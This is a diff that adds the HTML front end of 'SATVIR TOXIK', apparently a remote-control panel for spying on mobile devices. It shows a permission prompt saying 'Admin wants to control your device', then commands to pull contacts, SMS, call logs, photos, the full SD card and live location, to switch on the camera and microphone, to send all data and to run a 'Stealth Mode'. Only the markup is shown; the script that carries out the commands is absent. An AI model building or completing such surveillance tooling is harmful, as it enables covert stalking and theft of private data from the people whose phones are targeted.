@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>SATVIR TOXIK - Device Control</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 SATVIR TOXIK</h1>
+            <p>Advanced Device Control Panel</p>
+        </div>
+
+        <!-- Permission Section -->
+        <div id="permissionSection" class="permission-card">
+            <div class="lock-icon">🔒</div>
+            <h2>⚠️ Permission Required</h2>
+            <p>Admin wants to control your device. Grant permissions to continue.</p>
+            <button id="allowBtn" class="btn-allow">✅ Allow Access</button>
+            <button id="denyBtn" class="btn-deny">❌ Deny</button>
+        </div>
+
+        <!-- Main Control Menu -->
+        <div id="controlSection" class="control-section" style="display: none;">
+            <div class="status-bar">
+                <span id="status">🟢 Connected to Admin</span>
+                <span id="deviceName"></span>
+            </div>
+
+            <div class="menu-grid">
+                <!-- Wi-Fi Controls -->
+                <div class="menu-item" data-cmd="wifi_on">
+                    <div class="icon">📶</div>
+                    <div class="label">Wi-Fi ON</div>
+                    <div class="status-badge" id="wifi_status">⚪</div>
+                </div>
+                <div class="menu-item" data-cmd="wifi_off">
+                    <div class="icon">📶❌</div>
+                    <div class="label">Wi-Fi OFF</div>
+                    <div class="status-badge" id="wifi_off_status">⚪</div>
+                </div>
+
+                <!-- Hotspot Controls -->
+                <div class="menu-item" data-cmd="hotspot_on">
+                    <div class="icon">🔥📱</div>
+                    <div class="label">Hotspot ON</div>
+                    <div class="status-badge" id="hotspot_on_status">⚪</div>
+                </div>
+                <div class="menu-item" data-cmd="hotspot_off">
+                    <div class="icon">🔥❌</div>
+                    <div class="label">Hotspot OFF</div>
+                    <div class="status-badge" id="hotspot_off_status">⚪</div>
+                </div>
+
+                <!-- Flashlight -->
+                <div class="menu-item" data-cmd="flash_on">
+                    <div class="icon">🔦</div>
+                    <div class="label">Flashlight ON</div>
+                    <div class="status-badge" id="flash_on_status">⚪</div>
+                </div>
+                <div class="menu-item" data-cmd="flash_off">
+                    <div class="icon">🔦❌</div>
+                    <div class="label">Flashlight OFF</div>
+                    <div class="status-badge" id="flash_off_status">⚪</div>
+                </div>
+
+                <!-- Data Collection -->
+                <div class="menu-item" data-cmd="contacts">
+                    <div class="icon">📞</div>
+                    <div class="label">Contacts</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="sms">
+                    <div class="icon">📨</div>
+                    <div class="label">SMS</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="calllog">
+                    <div class="icon">📜</div>
+                    <div class="label">Call Log</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="location">
+                    <div class="icon">📍</div>
+                    <div class="label">Location</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="stealth">
+                    <div class="icon">🎭</div>
+                    <div class="label">Stealth Mode</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="camera_front">
+                    <div class="icon">📷</div>
+                    <div class="label">Camera Front</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="camera_back">
+                    <div class="icon">📸</div>
+                    <div class="label">Camera Back</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="live_location">
+                    <div class="icon">🔄</div>
+                    <div class="label">Live Location</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="alldata">
+                    <div class="icon">📦</div>
+                    <div class="label">Send All Data</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="microphone">
+                    <div class="icon">🎤</div>
+                    <div class="label">Microphone</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="vibration">
+                    <div class="icon">📳</div>
+                    <div class="label">Vibration</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="gallery">
+                    <div class="icon">🖼️</div>
+                    <div class="label">Gallery Photos</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="apps">
+                    <div class="icon">📱</div>
+                    <div class="label">Installed Apps</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="deviceinfo">
+                    <div class="icon">💻</div>
+                    <div class="label">Device Info</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="downloads">
+                    <div class="icon">📂</div>
+                    <div class="label">Download Folder</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="dcim">
+                    <div class="icon">📷</div>
+                    <div class="label">DCIM/Camera</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="pictures">
+                    <div class="icon">🖼️</div>
+                    <div class="label">Pictures</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+                <div class="menu-item" data-cmd="sdcard">
+                    <div class="icon">💾</div>
+                    <div class="label">Full SD Card</div>
+                    <div class="status-badge off">OFF</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Toast Message -->
+        <div id="toast" class="toast"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
